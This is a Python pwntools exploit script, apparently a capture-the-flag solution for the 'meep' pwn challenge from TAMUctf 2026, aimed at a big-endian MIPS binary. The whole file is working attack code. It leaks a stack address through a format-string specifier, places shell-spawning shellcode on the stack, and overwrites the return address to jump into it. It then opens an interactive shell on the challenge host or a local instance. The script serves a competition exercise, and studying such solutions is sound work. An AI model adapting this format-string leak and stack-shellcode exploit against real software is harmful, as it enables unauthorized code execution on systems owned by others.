#!/usr/bin/env python3
from pwn import *

TARGET_PATH = os.path.realpath("/ctf-writeups/2026/tamuctf/pwn/meep/dist/meep")
LIBC_PATH = os.path.realpath(
    "/ctf-writeups/2026/tamuctf/pwn/meep/dist/lib-mips/libc.so.6"
)
LIBRARY_PATH = os.path.dirname(LIBC_PATH)

context.update(
    arch="mips",
    endian="big",
    log_level="debug",
    terminal=["tmux", "split-window", "-h"],
)


def get_stream():
    if "remote" in sys.argv:
        return remote("streams.tamuctf.com", 443, ssl=True, sni="meep")

    return remote("127.0.0.1", 9001)


def attach_gdb():
    if "debug" not in sys.argv:
        return

    bkps = []
    cmds = []

    gdbscript = ["break {}".format(x) for x in bkps] + cmds
    gdb.attach(
        ("127.0.0.1", 1234),
        exe=TARGET_PATH,
        gdbscript="\n".join(gdbscript),
    )

    r = process(["qemu-mips", "-g", "1234", "-L", LIBRARY_PATH, TARGET_PATH])
    r.recvuntil(b"9001...\n")


def exploit(r):
    payload = b"%40$p\n"
    r.sendafter(b"name: ", payload)
    r.recvuntil(b"Hello:\n\n")
    stack_leak = int(r.recvline().decode().strip(), 16)

    shellcode = asm(shellcraft.sh())
    payload = shellcode.rjust(0x8C, b"\0")
    payload += p32(stack_leak - 0x90)

    r.sendafter(b"command:\n", payload)
    r.interactive()


def main():
    attach_gdb()
    r = get_stream()
    exploit(r)


if __name__ == "__main__":
    main()
